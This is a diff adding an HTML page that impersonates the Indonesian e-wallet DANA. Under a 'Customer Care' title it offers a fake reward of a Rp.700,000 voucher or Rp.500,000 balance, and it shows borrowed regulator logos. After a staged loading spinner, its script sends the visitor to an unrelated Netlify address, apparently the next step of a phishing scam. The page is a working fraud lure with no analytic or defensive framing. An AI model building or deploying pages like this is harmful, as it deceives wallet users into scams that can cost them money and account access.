@@ -1,1 +1,234 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#118EEA">
+    <title>DANA | Customer Care</title>
+    <meta name="description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA.">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSnNopW1eb2p8flX96OeDKBla_ESmxgUt5JIg&usqp=CAU">
+    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSnNopW1eb2p8flX96OeDKBla_ESmxgUt5JIg&usqp=CAU">
+    <link rel="shortcut icon" href="https://hosting.tigerengine.id/shv5u3.png" type="image/x-icon">
+    <link rel="apple-touch-icon" href="https://hosting.tigerengine.id/shv5u3.png">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #fff;
+            font-family: 'Open Sans', sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
 
+        h1 {
+            background: #0086e0;
+            padding: 10px;
+            text-align: center;
+            margin: 0;
+        }
+
+        h1 img {
+            width: 100px;
+        }
+
+        .container {
+            flex: 1;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 15px;
+            padding-bottom: 80px; /* Tambahkan padding-bottom untuk menggeser footer ke atas */
+            box-sizing: border-box;
+        }
+
+        .slider {
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .slider img {
+            width: 100%;
+            max-width: 100%;
+            border-radius: 10px;
+        }
+
+        .btn-punya {
+            display: block;
+            margin: 20px auto;
+            padding: 10px;
+            background: #0086e0;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 536px;
+        }
+
+        .form-log {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #0086e0;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+
+        .panel-body {
+            overflow: auto;
+            max-height: 300px;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            background-color: #f8f9fa;
+            margin-top: auto; /* Footer selalu di bagian bawah */
+            position: relative; /* Tambahkan position relative */
+            top: -40px; /* Geser footer ke atas */
+        }
+
+        /* Proses Loading */
+        .process {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading {
+            text-align: center;
+            position: absolute; /* Mengubah dari relative ke absolute */
+            top: 50%; /* Posisikan di tengah vertikal */
+            left: 50%; /* Posisikan di tengah horizontal */
+            transform: translate(-50%, -50%); /* Geser ke tengah */
+        }
+
+        .loading img {
+            width: 50px;
+        }
+
+        .loading .spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        /* Style untuk label radio button */
+        .panel-body label {
+            font-weight: bold; /* Membuat teks lebih tebal */
+            color: #118EEA; /* Mengubah warna teks menjadi #118EEA */
+            font-size: 16px; /* Ukuran font lebih besar */
+            line-height: 1.5; /* Jarak antar baris */
+            margin-left: 8px; /* Jarak antara radio button dan teks */
+            display: inline-block; /* Membuat label sejajar dengan radio button */
+            vertical-align: middle; /* Menyelaraskan teks dengan radio button */
+        }
+
+        /* Style untuk radio button */
+        .panel-body input[type="radio"] {
+            margin: 0; /* Menghapus margin default */
+            vertical-align: middle; /* Menyelaraskan radio button dengan teks */
+        }
+    </style>
+</head>
+<body>
+    <h1>
+        <img src="https://hosting.tigerengine.id/ulqfeu.png" alt="DANA Logo">
+    </h1>
+    <div class="container">
+        <div class="slider">
+            <div><img src="https://hosting.tigerengine.id/nq3zwi.png" alt="Promo 1"></div>
+            <div><img src="https://hosting.tigerengine.id/kiduv9.png" alt="Promo 2"></div>
+            <div><img src="https://hosting.tigerengine.id/f452ma.png" alt="Promo 3"></div>
+            <div><img src="https://hosting.tigerengine.id/s6h6sa.png" alt="Promo 4"></div>
+            <div><img src="https://hosting.tigerengine.id/inx5ba.png" alt="Promo 5"></div>
+        </div>
+        <form id="patok" onsubmit="pilat(event)">
+            <div class="panel panel-info" style="outline: 2px double #0086e0; border-radius: 13px;">
+                <div class="panel-body">
+                    <h2 style="text-align: center; font-size: 20px; border-bottom: 1px solid #0086e0; color: #0086e0;">
+                        TUKARKAN POINT ANDA DI BAWAH
+                    </h2>
+                    <div>
+                        <input type="radio" id="baru" name="tarif" value="Voucher Belanja Rp.700.000" required>
+                        <label for="baru">Voucher Belanja Rp.700.000</label>
+                    </div>
+                    <div>
+                        <input type="radio" id="lama" name="tarif" value="Saldo Dana Rp.500.000" required>
+                        <label for="lama">Saldo Dana Rp.500.000</label>
+                    </div>
+                </div>
+            </div>
+        </form>
+        <!-- Loading Spinner -->
+        <div class="process" id="process1">
+            <div class="loading">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZH-N0wN6FAmkGgyk10EQ7jvi3t_76GOfnax8pM8juwlMyN4KOy-2WuI68vLTMOnZyZmnNa7MHNI9U2k-ZcGYWruvALXJ-VnD1i4iBfezdLGGtFzjvpAmiLogvJeuvKHWwazaeN5cE6A0r9Gmiu7ObxeLFIc29G1pOJlc1QY8GPjMmZGvO0uTQX5X12rk/s1600/load_bg.png" alt="Loading Background">
+                <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjymgZkivno__fWTdTz6vvunARIRJI4BZogXCTs1Q35vHyxC3A1oZU4JyRKdwoXwJsKF90P0B-7Tilt7sPl0VfXIdaltZEX6c97hkKpVD6MOMS04xpqaH4HL318jf_bOGlOhIL2KmyJMZfH_mhw9AqxGr28S53SYvvQaVSUwMtoWXsup2HC83uzdzoVHtY/s1600/load_spin.png" alt="Loading Spinner">
+            </div>
+        </div>
+    </div>
+    <footer>
+        <!-- Tombol Konfirmasi dipindahkan ke atas <h6> -->
+        <button type="submit" form="patok" class="btn-punya">Konfirmasi</button>
+        
+        <!-- Tulisan <h6> dan gambar-gambar -->
+        <h6>Dana Terdaftar dan diawasi oleh:</h6>
+        <img src="https://hosting.tigerengine.id/sxbut9.png" width="70">
+        <img src="https://hosting.tigerengine.id/45b4wg.png" width="70">
+        <img src="https://hosting.tigerengine.id/vfejf1.jpg" width="70">
+        <img src="https://hosting.tigerengine.id/srk5n2.png" width="70">
+    </footer>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            $('.slider').slick({
+                autoplay: true,
+                autoplaySpeed: 2000,
+                dots: true
+            });
+        });
+
+        function pilat(event) {
+            event.preventDefault(); // Mencegah form submit default
+
+            // Ambil nilai yang dipilih
+            const tarif = $('input[name="tarif"]:checked').val();
+            if (tarif) {
+                // Simpan ke sessionStorage
+                sessionStorage.setItem('tarif', tarif);
+
+                // Tampilkan loading spinner
+                $("#process1").fadeIn();
+
+                // Set timeout untuk simulasi loading
+                setTimeout(() => {
+                    // Redirect ke halaman yang diinginkan
+                    window.location.href = 'https://ayo-klaim-sekarang-2025.netlify.app/';
+                }, 2000); // Loading selama 1 detik (2000 milidetik)
+            } else {
+                alert("Silakan pilih salah satu opsi."); // Jika tidak ada yang dipilih
+            }
+        }
+    </script>
+</body>
+</html>
